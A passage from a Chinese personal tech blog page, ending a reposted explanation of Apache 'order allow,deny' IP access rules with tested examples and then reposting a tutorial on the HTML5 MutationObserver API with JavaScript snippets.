219.204.253.8 #全部都可以通行 ——————————- ——————————- order deny,allow allow from 218.20.253.2 deny from 218.20 #代表拒绝218.20开头的IP，但允许218.20.253.2通过；而其它非218.20开头的IP也都允许通过。 ——————————- order allow,deny allow from 218.20.253.2 deny from 218.20 #和上面的差不多，只是掉换的order语句中的allow、deny先后顺序，但最终结果表示全部都拒绝！      form:<a href="http://hi.baidu.com/enjoypain/blog/item/f48c7aecdba298d12f2e21ac.html">http://hi.baidu.com/enjoypain/blog/item/f48c7aecdba298d12f2e21ac.html</a>      前段时间做了个Apache的HTTP代理服务器，其中的order allow，deny这部分弄的不太懂，于是上网找资料看，谁知道越看越糊涂，其中有些难以分辨对错甚至是误导。就像破解windows系统密码的一些文章那样，很多都是人云亦云的，并没有经过测试。废话少说，先把我经过测试后分析总结出来的结论show出来，相信这对大家的理解非常有帮助。 总则—— 影响最终判断结果的只有两点： 1. order语句中allow、deny的先后顺序； 2. allow、deny语句中各自包含的范围。 温馨提醒—— 1. 修改完配置后要保存好并重启Apache服务，配置才能生效； 2. 开头字母不分大小写； 3. allow、deny语句不分先后顺序，谁先谁后不影响最终判断结果；但都会被判断到； 4. order语句中，“allow,deny”之间“有且只有”一个逗号（英文格式的），而且先后顺序很重要； 5. Apache有一条缺省规则，“order allow,deny”本身就默认了拒绝所有的意思，因为deny在allow的后面；同理，“order deny,allow”本身默认的是允许所有；当然，最终判断结果还要综合下面的allow、deny语句中各自所包含的范围；（也就是说order语句后面可以没有allow、deny语句） 6. allow、deny语句中，第二个单词一定是“from”，否则Apache会因错而无法启动， 7. “order allow,deny”代表先判断allow语句再判断deny语句，反之亦然。 上面说的都是要记住的，而下面说的是我独创的理解方法。如果有人看了而没有豁然开朗的感觉，那算是我的失败！ 判断原则分4步走—— 1. 首先判断默认的； 2. 然后判断逗号前的； 3. 最后判断逗号后的； 4. 最终按顺序叠加而得出判断结果。 上面三点我说的简单而形象，主要是为了便于记忆。暂时不理解不要紧，继续看下面详细的解说自然会明白。下面以一个普通例子来做解释—— order deny,allow allow from 218.20.253.2 deny from 218.20 1. 所谓“首先判断默认的”，就是判断“order deny,allow”这句，它默认是允许所有； 2. 所谓“然后判断逗号前的”，因为在本例子中的order语句里面，deny在逗号的前面，所以现在轮到判断下面的deny语句了——“deny from 218.20”； 3. 所谓“最后判断逗号后的”，因为在本例子中的order语句里面，allow在逗号的后面，所以最后轮到判断下面的allow语句了——“allow from 218.20.253.2”。 4. 所谓“最终按顺序叠加而得出判断结果”，这是一个形象化了的说法，我把每一步判断都看作一个“不透明的图层”，然后一步步按顺序叠加上去，最终得出的“图像”就是判断结果。 用过作图软件的人应该都知道“图层”是怎么回事，我估计Apache关于order allow deny这方面的设计理念和photoshop等作图软件关于图层的设计理念是一样的。即“游戏规则”是一样的。 那么上面的例子就可以是这么一个步骤和图像—— 1. 先画一个白色的大圆，代表“order deny,allow”语句，默认意思是允许所有； 2. 然后画一个小一点的黑色圆，代表“deny from 218.20”语句，意思是拒绝所有以218.20开头的IP，放进白色的大圆里面； 3. 最后再画一个白色的圆，代表“allow from 218.20.253.2”语句，意思是允许218.20.253.2通过，放在黑色圆的上面。 4. 到此为止，我们已经可以看到一个结果了，白色大圆上面有一个黑色圆，黑色圆上面还有一个白色圆。最后，我们所能看到的黑色部分就是拒绝通行的，剩下的白色部分都是允许通行的。判断的结果就是这么简单形象！ 如果不懂的用作图软件，我们再来个非常贴近生活的比喻—— 把上面的例子改动一点点，以便更好的理解： order deny,allow allow from 218.20.253.2 deny from 219.30 1. 首先拿一张A4白纸，代表第order语句，意思是允许全部； 2. 然后拿一张黑色纸剪一个圆，放在A4纸里面的某个位置上，代表deny语句，意思是拒绝所有以219.30开头的IP； 3. 最后拿白纸再剪一个圆，放在黑色圆的旁边，代表allow语句，意思是允许218.20.253.2通过；注意，这个例子不是放进黑色圆里面了，因为deny和allow语句不再有相互包含的关系了。 4. A4纸上面有一个黑色圆和一个白色圆，结果自然很明显了。不过白色的A4纸上再放一个白色的圆，显然是多余的了，因为大家都是白色的，都代表允许，所以就重复了，可以去掉白色的圆而不会影响判断结果。 如果看到这里还没明白，那一定是我还有什么没说清楚的。那么请好好分析我所做过的测试例子，将在最后列出来。 在这里再啰嗦一下，allow、deny语句后面跟的参数有多种形式，有不同的表达方式，我在网上看到的做法是deny from IP1 IP2 IP3或allow from domain.com等。其它的表达方式大家再找别的资料看吧。我想说的是另一种表达方式： order deny,allow allow from IP1 IP2 allow from domain.info allow from 219.20.55.0/24 deny from all 我没具体验证过这是否对，不过这样是可以正常启动Apache服务的，按道理应该是正确的表达方式。哈哈，像我这样的入门者只能这样了，还希望大家多多指教！ 下面是测试过的例子： ——————————– Order deny,allow allow from all deny from 219.204.253.8 #全部都可以通行 ——————————- Order deny,allow deny from 219.204.253.8 allow from all #全部都可以通行 ——————————- Order allow,deny deny from 219.204.253.8 allow from all #只有219.204.253.8不能通行 ——————————- Order allow,deny allow from all deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- ——————————- Order allow,deny deny from all allow from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 deny from all #全部都不能通行 ——————————- Order deny,allow allow from 219.204.253.8 deny from all #只允许219.204.253.8通行 ——————————- Order deny,allow deny from all allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- ——————————– Order deny,allow #全部都可以通行（默认的） ——————————- Order allow,deny #全部都不能通行（默认的） ——————————- Order allow,deny deny from all #全部都不能通行 ——————————- Order deny,allow deny from all #全部都不能通行 ——————————- 对于上面两种情况，如果换成allow from all，则全部都可以通行！ ——————————- Order deny,allow deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- Order allow,deny deny from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- Order deny,allow allow from 219.204.253.8 #全部都可以通行 ——————————- ——————————- order deny,allow allow from 218.20.253.2 deny from 218.20 #代表拒绝218.20开头的IP，但允许218.20.253.2通过；而其它非218.20开头的IP也都允许通过。 ——————————- order allow,deny allow from 218.20.253.2 deny from 218.20 #和上面的差不多，只是掉换的order语句中的allow、deny先后顺序，但最终结果表示全部都拒绝！   </p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/html5-mutation-observer-2/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/html5-mutation-observer-2/index.html" itemprop="url">
                  html5新特性: MutationObeserver
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-08-11 00:43:56" itemprop="dateCreated datePublished" datetime="2017-08-11T00:43:56+08:00">2017-08-11</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>帮一哥们儿搞node-red的前端，需要实时获取node-red数据并在canvas上做相应的绘图工作，几番百度之后百度到了Mutation-Observer这样一个神奇的新特性。因此引用一下别的表哥写的关于MutationObserver的使用说明作为以后的参考。转自：<a href="http://www.cnblogs.com/jscode/p/3600060.html">http://www.cnblogs.com/jscode/p/3600060.html</a></p>
<h1 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h1><p>Mutation Observer（变动观察器）是监视DOM变动的接口。当DOM对象树发生任何变动时，Mutation Observer会得到通知。 要概念上，它很接近事件。可以理解为，当DOM发生变动会触发Mutation Observer事件。但是，它与事件有一个本质不同：事件是同步触发，也就是说DOM发生变动立刻会触发相应的事件；Mutation Observer则是异步触发，DOM发生变动以后，并不会马上触发，而是要等到当前所有DOM操作都结束后才触发。 这样设计是为了应付DOM变动频繁的情况。举例来说，如果在文档中连续插入1000个段落（p元素），会连续触发1000个插入事件，执行每个事件的回调函数，这很可能造成浏览器的卡顿；而Mutation Observer完全不同，只在1000个段落都插入结束后才会触发，而且只触发一次。 Mutation Observer有以下特点：</p>
<ul>
<li>它等待所有脚本任务完成后，才会运行，即采用异步方式</li>
<li>它把DOM变动记录封装成一个数组进行处理，而不是一条条地个别处理DOM变动。</li>
<li>它即可以观察发生在DOM节点的所有变动，也可以观察某一类变动</li>
</ul>
<p>目前，Firefox(14+)、Chrome(26+)、Opera(15+)、IE(11+)和Safari(6.1+)支持这个API。Safari 6.0和Chrome 18-25使用这个API的时候，需要加上WebKit前缀（WebKitMutationObserver）。可以使用下面的表达式检查浏览器是否支持这个API。</p>
<p>var MutationObserver = window.MutationObserver ||<br>    window.WebKitMutationObserver ||<br>    window.MozMutationObserver;</p>
<p>var mutationObserverSupport = !!MutationObserver;</p>
<h1 id="2、使用方法"><a href="#2、使用方法" class="headerlink" title="2、使用方法"></a>2、使用方法</h1><p>首先，使用MutationObserver构造函数，新建一个实例，同时指定这个实例的回调函数。</p>
<p>var observer = new MutationObserver(callback);</p>
<h2 id="2-1-observer方法"><a href="#2-1-observer方法" class="headerlink" title="2.1 observer方法"></a>2.1 observer方法</h2><p>observer方法指定所要观察的DOM元素，以及要观察的特定变动。</p>
<p>var article = document.querySelector(‘article’);</p>
<p>var options = {<br>    ‘childList’: true,<br>    ‘arrtibutes’: true<br>};</p>
<p>observer.observer(article, options);</p>
<p>上面代码首先指定，所要观察的DOM元素提article，然后指定所要观察的变动是子元素的变动和属性变动。最后，将这两个限定条件作为参数，传入observer对象的observer方法。 MutationObserver所观察的DOM变动（即上面代码的option对象），包含以下类型：</p>
<ul>
<li>childList：子元素的变动</li>
<li>attributes：属性的变动</li>
<li>characterData：节点内容或节点文本的变动</li>
<li>subtree：所有下属节点（包括子节点和子节点的子节点）的变动</li>
</ul>
<p>想要观察哪一种变动类型，就在option对象中指定它的值为true。需要注意的是，不能单独观察subtree变动，必须同时指定childList、attributes和characterData中的一种或多种。 除了变动类型，option对象还可以设定以下属性：</p>
<ul>
<li>attributeOldValue：值为true或者为false。如果为true，则表示需要记录变动前的属性值。</li>
<li>characterDataOldValue：值为true或者为false。如果为true，则表示需要记录变动前的数据值。</li>
<li>attributesFilter：值为一个数组，表示需要观察的特定属性（比如[‘class’, ‘str’]）。</li>
</ul>
<h2 id="2-2-disconnect方法和takeRecord方法"><a href="#2-2-disconnect方法和takeRecord方法" class="headerlink" title="2.2 disconnect方法和takeRecord方法"></a>2.2 disconnect方法和takeRecord方法</h2><p>disconnect方法用来停止观察。发生相应变动时，不再调用回调函数。</p>
<p>observer.disconnect();</p>
<p>takeRecord方法用来清除变动记录，即不再处理未处理的变动。</p>
<p>observer.takeRecord</p>
<h2 id="2-3-MutationRecord对象"><a href="#2-3-MutationRecord对象" class="headerlink" title="2.3 MutationRecord对象"></a>2.3 MutationRecord对象</h2><p>DOM对象每次发生变化，就会生成一条变动记录。这个变动记录对应一个MutationRecord对象，该对象包含了与变动相关的所有信息。Mutation Observer进行处理的一个个变动对象所组成的数组。 MutationRecord对象包含了DOM的相关信息，有如下属性：</p>
<ul>
<li>type:观察的变动类型（attribute、characterData或者childList）。</li>
<li>target:发生变动的DOM对象。</li>
<li>addedNodes:新增的DOM对象。</li>
<li>removeNodes:删除的DOM对象。</li>
<li>previousSibling:前一个同级的DOM对象，如果没有则返回null。</li>
<li>nextSibling:下一个同级的DOM对象，如果没有就返回null。</li>
<li>attributeName:发生变动的属性。如果设置了attributeFilter，则只返回预先指定的属性。</li>
<li>oldValue:变动前的值。这个属性只对attribute和characterData变动有效，如果发生childList变动，则返回null。</li>
</ul>
<h1 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h1><h2 id="3-1-子元素的变动"><a href="#3-1-子元素的变动" class="headerlink" title="3.1 子元素的变动"></a>3.1 子元素的变动</h2><p>下面的例子说明如果读取变动记录。</p>
<p>var callback = function(records) {<br>    records.map(function(record) {<br>        console.log(‘Mutation type: ‘ + record.type);<br>        console.log(‘Mutation target: ‘ + record.target);<br>    });<br>};</p>
<p>var mo = new MutationObserver(callback);</p>
<p>var option = {<br>    ‘childList’: true,<br>    ‘subtree’: true<br>};</p>
<p>mo.observer(document.body, option);</p>
<p>上面代码的观察器，观察body元素的所有下级元素（childList表示观察子元素，subtree表示观察子元素的下级元素）的变动。回调函数会在控制台显示所有变动的类型和目标元素。</p>
<h2 id="3-2、属性的变动"><a href="#3-2、属性的变动" class="headerlink" title="3.2、属性的变动"></a>3.2、属性的变动</h2><p>下面的例子说明如何追踪属性的变动。</p>
<p>var callback = function(records) {<br>    records.map(function(record) {<br>        console.log(‘Previous attribute value: ‘ + record.oldValue);<br>    });<br>};</p>
<p>var mo = new MutationObserver(callback);</p>
<p>var element = document.getElementById(‘#my_element’);</p>
<p>var option = {<br>    ‘attribute’: true,<br>    ‘attributeOldValue’: true<br>};</p>
<p>mo.observer(element, option);</p>
<p>上面代码先设定追踪属性变动（’attributes’: true），然后设定记录变动前的值。实际发生变动时，会将变动前的值显示在控制台。</p>
<h1 id="4、参考链接"><a href="#4、参考链接" class="headerlink" title="4、参考链接"></a>4、参考链接</h1><p>[1] Tiffany Brown, <a href="http://dev.opera.com/articles/view/mutation-observers-tutorial/">Getting to know mutation observers</a> [2] Michal Budzynski, <a href="http://michalbe.blogspot.com/2013/04/javascript-less-known-parts-dom.html">JavaScript: The less know parts.DOM Mutations</a> [3] Jeff Griffiths, <a href="https://hacks.mozilla.org/2012/05/dom-mutationobserver-reacting-to-dom-changes-without-killing-browser-performance/">DOM MutationObserver - reacting to DOM changes without killing browser performance</a> [4] Ruanyf, <a href="http://javascript.ruanyifeng.com/dom/mutationobserver.html">Mutation Observer</a></p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4" alt="Imagemlt">
            
              <p class="site-author-name" itemprop="name">Imagemlt</p>
              <p class="site-description motion-element" itemprop="description">personal blog</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">50</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">12</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">11</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/imagemlt" target="_blank" title="GitHub" rel="external nofollow"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
            </div>
          

          
          

          
          

          
            
          
          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Imagemlt</span>

  

  
</div>


  



  <div class="powered-by">Powered by <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>

Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>

  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" rel="external nofollow" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.3.0</div>




  <script src="https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js"></script>
  <script>
    if (window.mermaid) {
//alert("mermaid!!!");
      mermaid.initialize({theme: 'forest'});
    }
  </script>


        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



	





  





  










  





  

  

  

  

  
  

  

  

  

  

  

</body>
</html>
